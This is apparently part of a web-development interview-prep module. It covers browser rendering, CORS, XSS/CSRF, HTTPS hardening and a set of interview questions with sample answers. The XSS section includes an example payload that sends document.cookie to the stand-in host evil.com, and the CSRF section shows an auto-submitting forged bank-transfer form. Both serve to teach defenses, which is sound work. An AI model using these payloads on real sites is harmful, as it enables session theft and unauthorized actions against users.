**2. Parse CSS → CSSOM.** CSS is **render-blocking**: the browser will not paint until it has all stylesheets, because painting with incomplete styles would produce a flash of unstyled content and then a full re-render. That's why stylesheets belong in \`<head>\` and why the number and size of them matters so much.

**3. JavaScript.** A plain \`<script>\` is **parser-blocking**: the parser stops, downloads, executes, and only then continues, because the script might call \`document.write\`. And because scripts can read computed styles, an incoming script must wait for pending CSS. So one stylesheet plus one synchronous script in the head can serialize your whole load.

\`\`\`html
<script src="a.js"></script>          <!-- blocks parsing; download + execute now -->
<script src="a.js" async></script>    <!-- downloads in parallel, executes ASAP,
                                            interrupts parsing, order NOT guaranteed -->
<script src="a.js" defer></script>    <!-- downloads in parallel, executes after
                                            parsing completes, in document order -->
<script src="a.js" type="module"></script> <!-- deferred by default -->
\`\`\`

Use \`defer\` for anything that touches the DOM; \`async\` only for independent third-party scripts like analytics.

**4. Render tree.** DOM ∩ CSSOM, keeping only what will be displayed. \`display: none\` nodes are excluded entirely; \`visibility: hidden\` nodes are kept, because they still occupy space.

**5. Layout (reflow).** Compute the exact position and size of every box. This is global and expensive — changing one element's width can move everything after it.

**6. Paint.** Fill in pixels: text, colors, borders, shadows. The page may be split into multiple **layers**.

**7. Composite.** The GPU assembles the layers in the right order. Transforms and opacity on their own layer can be composited without repainting anything.

### Why this determines performance

| You change | Stages re-run |
| --- | --- |
| \`width\`, \`height\`, \`top\`, \`font-size\`, adding a DOM node | **Layout → Paint → Composite** (most expensive) |
| \`background-color\`, \`box-shadow\`, \`visibility\` | Paint → Composite |
| \`transform\`, \`opacity\` (on a composited layer) | **Composite only** (cheapest) |

This is exactly why animations should use \`transform: translateX(...)\` rather than \`left\`, and \`opacity\` rather than \`visibility\` — they skip layout and paint and run on the GPU, holding 60 fps.

**Layout thrashing** is the classic bug: writing to the DOM and then reading a layout property forces a **synchronous reflow**, and doing it in a loop makes it quadratic.

\`\`\`js
// Bad: every read after a write forces a synchronous layout. O(n) forced reflows.
for (const el of items) {
  el.style.width = el.offsetWidth + 10 + "px";
}

// Good: batch all reads, then all writes.
const widths = items.map((el) => el.offsetWidth);   // read phase
items.forEach((el, i) => {                          // write phase
  el.style.width = widths[i] + 10 + "px";
});
\`\`\`

### The critical rendering path

The critical path is everything needed for the **first paint**: the HTML, the render-blocking CSS, and any parser-blocking JS. Optimizing it means minimizing three numbers — the count of critical resources, the bytes on the critical path, and the round trips.

Concretely:

- Inline the small amount of CSS needed for above-the-fold content; load the rest with \`media\` attributes or asynchronously.
- \`defer\` or \`async\` every script; move non-essential work out of the path entirely.
- \`<link rel="preload">\` for resources discovered late (a font referenced deep in CSS), \`preconnect\` for third-party origins so DNS+TCP+TLS happen in parallel with parsing.
- Compress (Brotli), and set long \`max-age\` on fingerprinted assets.
- Set \`width\`/\`height\` or \`aspect-ratio\` on images so layout doesn't shift when they load.
- Self-host or preload fonts and use \`font-display: swap\` to avoid invisible text.

### The metrics that matter

**LCP** (Largest Contentful Paint — when the main content appeared; target < 2.5 s), **INP** (Interaction to Next Paint — responsiveness; target < 200 ms), and **CLS** (Cumulative Layout Shift — how much things jumped; target < 0.1). Also **TTFB** for server/network time and **FCP** for first paint. Long JavaScript tasks hurt INP directly, because the event loop is single-threaded — a 300 ms task means a 300 ms delay before any click is handled.`,
    },
    {
      id: "same-origin-cors",
      heading: "Same-origin policy and CORS",
      markdown: `### Same-origin policy

An **origin** is the triple **(scheme, host, port)**. All three must match exactly.

\`\`\`text
Compared to https://app.example.com/page

https://app.example.com/other      SAME     (path is irrelevant)
http://app.example.com/page        different — scheme
https://api.example.com/page       different — host (subdomains count)
https://app.example.com:8443/page  different — port
\`\`\`

The same-origin policy stops a script on one origin from **reading** data from another. Without it, a page you visit could open your bank in an iframe and read the contents — since your cookies would be sent automatically.

What it blocks and what it doesn't is the crucial part:

- **Blocked:** reading a cross-origin \`fetch\`/XHR response, reading a cross-origin iframe's DOM, reading pixels from a canvas tainted by a cross-origin image.
- **Not blocked:** *sending* cross-origin requests. Embedding cross-origin images, scripts, stylesheets, iframes, and fonts. Submitting a form to another origin. Navigating.

That asymmetry — you may send but not read — is exactly why CSRF exists as a separate vulnerability class. The request goes through and has effects; the attacker just can't read the answer.

### CORS

CORS is a mechanism for a server to **relax** the same-origin policy for specific origins. Note the direction: it is not a restriction imposed on you, it's a permission granted by the resource server. And it is enforced **by the browser**, not by the network — curl, Postman, and any server-side client ignore CORS entirely. CORS is not a security control on your API; authentication and authorization are.

**Simple requests** (GET/HEAD/POST, with only safe-listed headers and a content type of \`text/plain\`, \`multipart/form-data\`, or \`application/x-www-form-urlencoded\`) go straight out; the browser then checks the response headers and hides the body from JS if they don't permit the origin.

**Everything else is preflighted** — including any request with \`Content-Type: application/json\` or an \`Authorization\` header, which is essentially every modern API call:

\`\`\`http
OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
\`\`\`

Then the real request goes out, and its response must *also* carry \`Access-Control-Allow-Origin\`.

### The rules that cause real bugs

- **\`Access-Control-Allow-Origin: *\` cannot be combined with \`Access-Control-Allow-Credentials: true\`.** If you need cookies, you must echo back the specific requesting origin — after validating it against an allowlist. Reflecting whatever \`Origin\` you're given is a serious vulnerability.
- **The client must opt in to credentials too**: \`fetch(url, { credentials: "include" })\`.
- **JS can only read simple response headers by default.** To expose others, list them in \`Access-Control-Expose-Headers\` — this is why people can't read their own \`X-Total-Count\` or \`Location\` header.
- **A CORS failure is not an HTTP error.** The request often succeeded on the server; the browser just refuses to hand the response to JavaScript, and \`fetch\` rejects with an opaque \`TypeError\` with no status. Check the network tab, not the console message.
- **Errors need headers too.** If your 500 handler doesn't emit CORS headers, the client sees a confusing CORS error instead of your actual error.
- **\`Access-Control-Max-Age\`** caches the preflight so you don't pay an extra round trip on every request.

If you control both sides, avoiding CORS entirely — by serving the API under the same origin via a reverse proxy path like \`/api\` — is often the cleanest answer, and saying that shows judgement.`,
    },
    {
      id: "xss-csrf",
      heading: "XSS and CSRF",
      markdown: `These two get confused constantly. The one-line distinction: **XSS is the attacker running their code on your site. CSRF is the attacker making the victim's browser send a request to your site.** XSS is an integrity failure in your output; CSRF is an authentication design failure.

### XSS — cross-site scripting

Untrusted input ends up executing as script in a victim's page, inside your origin, with full access to the DOM, \`localStorage\`, and any non-\`HttpOnly\` cookie.

**Stored (persistent)** — the payload is saved server-side (a comment, a profile name) and served to everyone. Worst impact.
**Reflected** — the payload is in the URL and echoed into the response; delivered by getting a victim to click a link.
**DOM-based** — never touches the server; client-side JS reads \`location.hash\` and writes it into the page.

\`\`\`js
// Vulnerable: innerHTML parses and executes what it's given.
el.innerHTML = "Hello, " + userName;
// userName = '<img src=x onerror="fetch(\\'//evil.com?c=\\'+document.cookie)">'

// Safe: textContent never parses markup.
el.textContent = "Hello, " + userName;
\`\`\`

**Defenses, in order of value:**

1. **Context-aware output encoding.** Escaping is not one operation — HTML body, HTML attribute, JavaScript string, URL, and CSS contexts each need different encoding. Use a templating engine that escapes by default (React, Jinja2 with autoescape on, Rails). React's \`{value}\` is safe; \`dangerouslySetInnerHTML\` is the deliberate opt-out, named that way on purpose.
2. **Never build HTML by string concatenation.** Prefer \`textContent\`, \`createElement\`, and framework binding. If you must accept rich text, sanitize with a vetted allowlist library (DOMPurify), never a regex.
3. **Content Security Policy** as defense in depth: \`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'self'\`. A strict nonce-based CSP means an injected \`<script>\` without the nonce simply won't run. It turns many XSS bugs into non-events.
4. **\`HttpOnly\` on session cookies**, so a successful XSS still can't read the session token. (It can still *make requests as the user* from within the page, so this limits the damage rather than eliminating it.)
5. Validate input on the way in as a bonus, but remember the real fix is on the way **out** — the same string is dangerous in HTML and harmless in JSON.

### CSRF — cross-site request forgery

The attacker's page causes the victim's browser to issue a state-changing request to your site. Because browsers attach cookies to cross-site requests automatically, the request is authenticated. The attacker cannot read the response (same-origin policy) — they don't need to, if the effect is "transfer money" or "change email."

\`\`\`html
<!-- On evil.com. Auto-submits on load; no JS interaction needed. -->
<form action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

**Defenses:**

1. **\`SameSite\` cookies.** \`Lax\` (now the browser default) stops cookies being sent on cross-site POSTs and subresource requests entirely, which kills the classic attack. \`Strict\` is stronger but breaks inbound links from other sites. This is the structural fix.
2. **Anti-CSRF tokens.** The server issues a random token tied to the session, embeds it in the form or exposes it to JS, and rejects requests without a matching one. The attacker's page cannot read the token (same-origin policy), so it cannot forge a valid request. The stateless variant is the **double-submit cookie**: the same random value in a cookie and in a header, compared server-side.
3. **Custom header requirement.** Requiring \`X-Requested-With\` or \`Authorization\` on state-changing endpoints works because setting a custom header triggers a CORS preflight, which the attacker's origin will fail. This is why **APIs using \`Authorization: Bearer\` instead of cookies are not CSRF-vulnerable at all** — nothing is attached automatically.
4. **Never use GET for state changes.** A \`GET /delete?id=5\` can be triggered by an \`<img>\` tag on any site in the world.
5. **Check \`Origin\`/\`Referer\`** on state-changing requests as a secondary control.

### The comparison, if asked directly

| | XSS | CSRF |
| --- | --- | --- |
| What happens | Attacker's script runs in your origin | Victim's browser sends a request to your origin |
| Attacker can read the response? | Yes — full DOM access | No |
| Requires a bug in your code? | Yes — unescaped output | No — just cookie auth without protection |
| Primary defense | Contextual output encoding + CSP | SameSite cookies + CSRF tokens |
| Does the other's defense help? | \`HttpOnly\` limits damage | XSS **defeats all CSRF defenses**, since the script can read the token |

That last row is the key insight: **XSS is strictly more powerful.** If you have XSS, CSRF protection is irrelevant, because the attacker's code is running inside your origin and can read any token it likes. Fix XSS first.`,
    },
    {
      id: "https-mixed-content",
      heading: "HTTPS, mixed content, and transport hardening",
      markdown: `### What HTTPS gets you, and what it doesn't

HTTPS is HTTP inside TLS. It gives you confidentiality, integrity, and server authentication for the **connection**. It says nothing about whether the application is secure, whether the site is honest, or whether the data is safe once it arrives.

What still leaks even with HTTPS: the destination **IP address**, the hostname in the TLS **SNI** field (cleartext, unless Encrypted Client Hello is in use), the DNS lookup (unless DoH/DoT), and the size and timing of your traffic — which is often enough to fingerprint which page you loaded.

Reasons everything is HTTPS now beyond secrecy: without it, any network operator can **inject** content (ISPs injecting ads, attackers injecting script), and browsers gate modern APIs — service workers, geolocation, the clipboard API, HTTP/2, HTTP/3 — behind a secure context.

### Mixed content

A page loaded over HTTPS that pulls subresources over HTTP. The padlock is a lie at that point: an attacker on the network can modify the HTTP resource.

- **Active mixed content** — scripts, stylesheets, iframes, XHR/fetch. These can rewrite the entire page, so browsers **block them outright**. This is why a single \`http://\` script tag makes a page mysteriously break.
- **Passive mixed content** — images, video, audio. Can't execute, but can be swapped to mislead the user or used to track. Browsers either upgrade or block it, and warn.

Fixes: use protocol-relative-free absolute \`https://\` URLs everywhere, and set \`Content-Security-Policy: upgrade-insecure-requests\` so the browser rewrites \`http://\` subresource URLs to \`https://\` automatically during a migration. Then fix the actual URLs.

### HSTS

\`\`\`http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
\`\`\`

Tells the browser to use HTTPS for this host for the next two years — no plain-HTTP request is even attempted, and certificate errors become non-bypassable. This closes the **SSL-stripping** window: the very first request to \`example.com\` typed without a scheme goes out over HTTP and can be hijacked before the redirect. \`preload\` gets the domain baked into browsers' shipped preload list so even the first-ever visit is protected. Add \`includeSubDomains\` carefully — it will break any subdomain that isn't ready — and know that preload removal is slow, so it's close to a one-way door.

### The other headers worth naming

| Header | Effect |
| --- | --- |
| \`Content-Security-Policy\` | Controls which sources may load/execute. The single strongest XSS mitigation. |
| \`X-Content-Type-Options: nosniff\` | Stops the browser guessing content types — prevents a JSON or text upload being executed as script. |
| \`X-Frame-Options: DENY\` / \`frame-ancestors\` in CSP | Prevents **clickjacking** — your page invisibly framed over an attacker's button. |
| \`Referrer-Policy: strict-origin-when-cross-origin\` | Stops leaking full URLs (which can contain tokens) to third parties. |
| \`Permissions-Policy\` | Disables camera, microphone, geolocation for the page and its frames. |
| \`Cross-Origin-Opener-Policy\` / \`Cross-Origin-Embedder-Policy\` | Process isolation; required for \`SharedArrayBuffer\` after Spectre. |
| \`Subresource Integrity\` (\`integrity="sha384-..."\`) | The browser verifies a CDN-hosted script's hash before executing it, so a compromised CDN can't silently swap it. |

### Certificate operations

Certificates expire — 90-day Let's Encrypt certificates with automated ACME renewal are the norm, and an expired certificate is a total outage with no graceful degradation, so monitor expiry as a first-class alert. Keep the private key off the repo and out of the image. Publish **CAA** records to constrain which CAs may issue for your domain, and watch **certificate transparency** logs for certificates you didn't request.`,
    },
  ],
  questions: [
    {
      q: "What happens when you type a URL into the browser and hit enter?",
      a: "The browser normalizes the URL and checks the HSTS preload list, rewriting http to https before any traffic leaves. It checks its own caches — a fresh response means no network at all. Then DNS: browser cache, OS cache and /etc/hosts, then a recursive resolver that walks root, TLD, and authoritative nameservers to get an A record. To actually send a packet it needs a MAC address for the next hop, found via ARP, and the packet is routed hop by hop with NAT applied at the home router. Then the TCP three-way handshake, then the TLS handshake — one round trip in 1.3 — during which ALPN negotiates the HTTP version and the client validates the certificate chain, hostname, and dates. The HTTP request goes out, possibly served by a CDN edge, otherwise proxied to an app server that queries a database and renders. The browser reads the status code, then parses HTML into the DOM and CSS into the CSSOM, builds the render tree, lays out, paints, and composites — discovering subresources along the way and repeating the whole process for each. Finally scripts execute, DOMContentLoaded and load fire. I can go deeper on DNS, TLS, or rendering if you'd like.",
      weak: "The browser looks up the domain in DNS, sends an HTTP request to the server, gets HTML back, and renders it.",
    },
    {
      q: "Why is the TCP handshake three messages instead of two?",
      a: "Because both directions have to be established, and each side needs confirmation that the other received its initial sequence number. The client's SYN proposes sequence x; the server's SYN-ACK acknowledges x and proposes y; the client's ACK acknowledges y. With only two messages the server would never know its own sequence number arrived. The handshake also negotiates options — MSS, window scaling, selective ACK. The initial sequence numbers are randomized so stale segments from a previous connection on the same 4-tuple can't be accepted and blind injection is impractical. The cost is a full round trip before any data — which is exactly the tax QUIC removes by merging the transport and crypto handshakes.",
    },
    {
      q: "TCP or UDP — when would you actually choose UDP?",
      a: "When retransmission is worse than loss, or when you want to control reliability yourself. In a voice call a 200 ms-old packet is worthless; TCP would stall the stream retransmitting data you'd discard anyway. DNS uses UDP because query and answer each fit in one datagram, so a handshake would triple the cost. Games send position updates where only the latest matters. Broadcast and multicast are UDP-only. And QUIC uses UDP specifically to escape TCP's head-of-line blocking so it can implement per-stream reliability. The obligation you take on is congestion control — a UDP application that ignores it will crowd out well-behaved TCP flows, which is why QUIC implements congestion control that mirrors TCP's.",
      weak: "UDP is faster because it doesn't check that packets arrive, so you use it for streaming and games.",
    },
    {
      q: "What's the difference between flow control and congestion control?",
      a: "Flow control protects the receiver from being overrun: the receiver advertises a window in each ACK saying how much buffer space it has left, and it's purely end to end. Congestion control protects the network: the sender maintains its own congestion window based on inferred conditions — loss, or delay in BBR's case — because no one tells it what the path can carry. The effective send window is the minimum of the two. Congestion control starts with slow start, doubling the window each RTT from about 10 segments, then switches to linear growth in congestion avoidance and cuts back on loss. The practical consequence is that a fresh TCP connection is slow — roughly 14 KB in the first round trip — which is the whole argument for connection reuse and keep-alive.",
    },
    {
      q: "What does a TLS certificate actually prove?",
      a: "That a CA verified control of the listed domain names at issuance time, and that whoever you're talking to holds the matching private key. That's the complete list. It does not prove the site is trustworthy, honest, or operated by the company whose name resembles the domain — a domain-validated certificate is free and issued to anyone who can answer an HTTP challenge, phishing sites included. The padlock means the connection is private and terminates at the domain in the address bar, nothing about the content. Validation walks the chain from leaf through intermediates to a root in the browser's trust store, checking signatures, dates, hostname match, and revocation. The model's weakness is that any of hundreds of trusted CAs can issue for any domain, which certificate transparency logs and CAA records exist to mitigate.",
      weak: "It proves the website is who it says it is and that the site is secure and safe to use.",
    },
    {
      q: "What is forward secrecy and why does TLS 1.3 require it?",
      a: "Forward secrecy means recording today's encrypted traffic and stealing the server's private key later still doesn't let you decrypt it. It comes from ephemeral Diffie-Hellman: each connection generates throwaway keypairs, both sides derive the same shared secret without it crossing the wire, and the keys are discarded afterwards. The certificate's private key is only used to sign the handshake, proving identity — it never encrypts the session key. Old RSA key transport had no forward secrecy, because the client encrypted the premaster secret to the server's long-term public key, so anyone who later obtained that key could decrypt every recorded session. TLS 1.3 removed RSA key transport, static DH, RC4, CBC MAC-then-encrypt, renegotiation, and compression, and cut the handshake to one round trip by having the client speculatively send a key share in the ClientHello.",
    },
    {
      q: "HTTP/2 fixed head-of-line blocking. Did it?",
      a: "It fixed it at the application layer and not at the transport layer. HTTP/1.1 blocked because a response had to complete before the next one could start on that connection, which is why people used six connections per origin plus domain sharding and giant bundles. HTTP/2's binary framing multiplexes many streams over one connection, so those workarounds became unnecessary and actively harmful. But all those streams still ride one TCP connection, and TCP guarantees in-order byte delivery — so one lost packet stalls every stream behind it, even ones whose bytes already arrived. On a lossy mobile link that can be worse than HTTP/1.1's six independent connections. HTTP/3 fixes it properly by running over QUIC on UDP, where the transport itself understands streams, so a loss only stalls its own stream. QUIC also merges the transport and crypto handshakes for 1-RTT setup and survives a network change via connection IDs.",
      weak: "HTTP/2 uses multiplexing so requests happen in parallel, which solves head-of-line blocking.",
    },
    {
      q: "What's the difference between 401 and 403? And between no-cache and no-store?",
      a: "401 means unauthenticated — you haven't proven who you are, and the response should include a WWW-Authenticate header telling you how. 403 means authenticated but unauthorized — we know exactly who you are and the answer is still no, so retrying with the same credentials is pointless. On caching: no-cache does not mean don't cache; it means store it but revalidate with the origin before every use, typically via an ETag, so you get a cheap 304 when it's unchanged. no-store means never write it to disk or memory at all, which is the one you want for sensitive data. The header people actually want when they say no-cache is usually no-store.",
      weak: "401 and 403 both mean access denied. no-cache and no-store both stop the browser caching.",
    },
    {
      q: "Which cookie attributes matter for security, and why?",
      a: "HttpOnly makes the cookie invisible to document.cookie, so an XSS payload can't exfiltrate the session token — non-negotiable for session cookies, and the main argument against keeping tokens in localStorage, which is fully readable by any script. Secure means it's only sent over HTTPS, so it can't leak over a plaintext request. SameSite is the structural CSRF defense: Lax, now the browser default, stops the cookie being attached to cross-site POSTs and subresource loads; Strict is stronger but breaks inbound links; None requires Secure. Domain matters more than people think — omitting it makes the cookie host-only, while setting it to the apex sends it to every subdomain, which is dangerous if you host untrusted content on one. The __Host- prefix enforces Secure, path /, and no Domain, making subdomain injection impossible.",
    },
    {
      q: "Explain CORS. Is it a security feature?",
      a: "The same-origin policy stops a script on one origin from reading a response from another, where origin is scheme, host, and port. CORS is how a server opts to relax that for specific origins. It's enforced by the browser only — curl, Postman, and any server-side HTTP client ignore it completely — so it is not a protection for your API; authentication and authorization are. It protects the *user's* browser from a malicious page reading their data from another site. Mechanically, anything beyond a simple request — including any JSON content type or an Authorization header — triggers an OPTIONS preflight that the server answers with Allow-Origin, Allow-Methods, and Allow-Headers, and the real response must carry the headers too. Gotchas: Allow-Origin: * can't be combined with Allow-Credentials, so with cookies you must echo a validated origin; the client also has to set credentials: include; JS can only read safe-listed response headers unless you add Expose-Headers; and a CORS failure surfaces as an opaque TypeError even though the server request usually succeeded.",
      weak: "CORS is a security feature that stops other websites from calling your API.",
    },
    {
      q: "Same-origin policy blocks cross-origin reads. So why does CSRF work?",
      a: "Because the policy blocks reading, not sending. A page on any origin can submit a form, load an image, or navigate to your site, and the browser attaches your cookies automatically because it's your domain. The attacker never sees the response — they don't need to if the effect is transferring money or changing an email address. That asymmetry is precisely what defines CSRF as its own vulnerability class. The defenses follow from it: SameSite=Lax stops the cookie being attached cross-site at all; a CSRF token works because the attacker's page can't read the token out of yours; and requiring a custom header works because setting one triggers a preflight the attacker's origin fails. That last point is why token-in-Authorization-header APIs aren't CSRF-vulnerable — nothing is sent automatically.",
    },
    {
      q: "XSS vs CSRF — and if you could only fix one?",
      a: "XSS is the attacker's script executing inside your origin, caused by putting untrusted data into a page without contextual encoding; the attacker gets full DOM access and can read anything. CSRF is the attacker causing the victim's browser to send an authenticated request to your site; the attacker can't read the response, and it exists not because of a bug in your code but because cookie auth is ambient. Defenses are different: contextual output encoding plus a strict nonce-based CSP for XSS; SameSite cookies plus CSRF tokens for CSRF. Fix XSS first, without question — XSS defeats every CSRF defense, because a script running in your origin can simply read the CSRF token out of the page. XSS is strictly the more powerful vulnerability.",
      weak: "XSS is when someone injects JavaScript and CSRF is when someone makes a fake request. You fix both by validating input.",
    },
    {
      q: "Walk me through the browser rendering pipeline, and tell me why animating `left` is worse than animating `transform`.",
      a: "HTML parses incrementally into the DOM, CSS into the CSSOM; combined they give the render tree of visible nodes with computed styles. Then layout computes the geometry of every box, paint fills pixels into layers, and the compositor assembles the layers on the GPU. Changing a geometric property like left, width, or font-size invalidates layout, which is global — moving one element can shift everything after it — so you pay layout, then paint, then composite. Changing background-color skips layout but still repaints. Changing transform or opacity on a composited layer skips both layout and paint and only re-composites, which the GPU does cheaply, so it holds 60 fps. Related trap: layout thrashing, where you write a style then immediately read offsetWidth in a loop, forcing a synchronous reflow every iteration. Batch all reads, then all writes.",
    },
    {
      q: "Why does a `<script>` tag in the head slow down page load, and what do async and defer change?",
      a: "A plain script is parser-blocking: the HTML parser stops, downloads, and executes before continuing, because the script could call document.write and change the document. Worse, since a script can read computed styles, it must also wait for any pending stylesheet — and CSS is render-blocking anyway, because painting with partial styles would flash unstyled content. So one stylesheet plus one synchronous script serializes your whole critical path. async downloads in parallel and executes as soon as it arrives, interrupting parsing, with no ordering guarantee — only appropriate for independent third-party scripts like analytics. defer downloads in parallel and executes after parsing finishes, in document order — the right default for anything that touches the DOM. Module scripts are deferred automatically.",
    },
    {
      q: "When would you use SSE instead of WebSockets?",
      a: "Whenever the data flows only server to client — notifications, live dashboards, progress updates, streaming LLM tokens. SSE is a single long-lived HTTP response of type text/event-stream, so it goes through proxies, reuses your existing cookies and auth, works with compression, and gives you automatic reconnection with resume built into the browser: it sends Last-Event-ID and you replay from there. Over WebSockets you'd hand-roll all of that plus heartbeats and backoff, and you'd make your server tier stateful. WebSockets are the right call when the client sends frequently too — chat, collaborative editing, games — where full duplex and a 2-14 byte frame header beat HTTP overhead. One warning: WebSockets are not covered by the same-origin policy, so you must validate the Origin header yourself or you have a cross-site hijacking hole.",
      weak: "WebSockets are better than SSE because they're bidirectional and faster, so I'd use WebSockets.",
    },
    {
      q: "What is mixed content and why does it break pages?",
      a: "An HTTPS page loading subresources over plain HTTP. It undermines the guarantee entirely — anyone on the network can modify that resource, and if it's a script they own the page. Browsers therefore distinguish active mixed content (scripts, stylesheets, iframes, fetch), which they block outright, from passive (images, video), which they upgrade or block with a warning. So a single http:// script tag makes a page mysteriously stop working with an error only in the console. Fixes: use https:// URLs everywhere, and set Content-Security-Policy: upgrade-insecure-requests during a migration so the browser rewrites them automatically. Related, add HSTS with a long max-age so the browser never even attempts plain HTTP — that closes the SSL-stripping window on the very first request, and preloading closes it for first-ever visits too.",
    },
    {
      q: "How does DNS TTL affect a migration, and what would you do before one?",
      a: "Every record carries a TTL telling resolvers how long to cache it. A 24-hour TTL means fast page loads and low query volume, but if you change the record, some resolvers keep sending traffic to the old address for a day. So the standard practice is to lower the TTL to about 60 seconds a day or more before the planned change — long enough that the old, long-TTL entries have all expired — do the migration, watch traffic shift, then raise it again. Two caveats worth adding: some resolvers and OS stacks ignore very short TTLs, and browsers pin their own DNS cache, so DNS is a poor failover mechanism to rely on alone. For real failover you want an anycast address or a load balancer with health checks, where the IP doesn't change at all.",
    },
  ],
};
